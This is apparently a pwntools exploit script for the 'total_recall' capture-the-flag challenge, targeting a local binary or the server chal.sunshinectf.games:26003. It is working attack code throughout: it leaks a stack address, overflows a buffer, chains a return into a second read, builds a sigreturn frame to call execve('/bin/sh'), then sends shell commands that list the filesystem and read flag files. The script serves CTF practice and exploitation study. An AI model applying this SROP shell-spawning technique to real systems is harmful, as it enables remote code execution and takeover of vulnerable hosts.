from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

BIN = './total_recall'
RET    = 0x40104e
SYSCALL_RET = 0x401069   # syscall ; ret  (in f2)
F2     = 0x40104f        # function doing read(0, rsp-0x80, 0x400)

def start():
    if args.REMOTE:
        return remote('chal.sunshinectf.games', 26003)
    return process(BIN)

io = start()
leak = u64(io.recvn(8))
log.info("leak = %#x", leak)
S = leak
B = S - 0x80          # buffer base for f2 read #1

# /bin/sh string lives at B+0x20  (stage2 overwrites only B[8..0x16])
str_off = 0x20
bin_sh = B + str_off

frame = SigreturnFrame()
frame.rax = constants.SYS_execve      # 59
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL_RET
frame.rsp = S                          # valid stack

buf = bytearray(b'\x90' * 0x80)
buf[0x80:0x88] = p64(F2)               # return into f2 again (read #2)
buf[0x88:0x90] = p64(SYSCALL_RET)      # ret addr after f2 read #2 -> rt_sigreturn
buf[0x90:0x90+len(bytes(frame))] = bytes(frame)
buf[str_off:str_off+8] = b'/bin/sh\x00'

# first small read in f1: 24 bytes
io.send(b'A' * 0x18)
time.sleep(0.3)
io.send(bytes(buf))        # f2 read #1 : big payload
time.sleep(0.6)
io.send(b'BBBBBBBBBBBBBBB')  # f2 read #2 : exactly 15 bytes -> rax = 15 = rt_sigreturn
time.sleep(0.5)

io.sendline(b'echo PWNED_MARKER_$((6*7)); id; ls -la /; cat /flag* flag* 2>/dev/null')
time.sleep(1)
try:
    print("RECV:", io.recvrepeat(3))
except Exception as e:
    print("ERR", e)
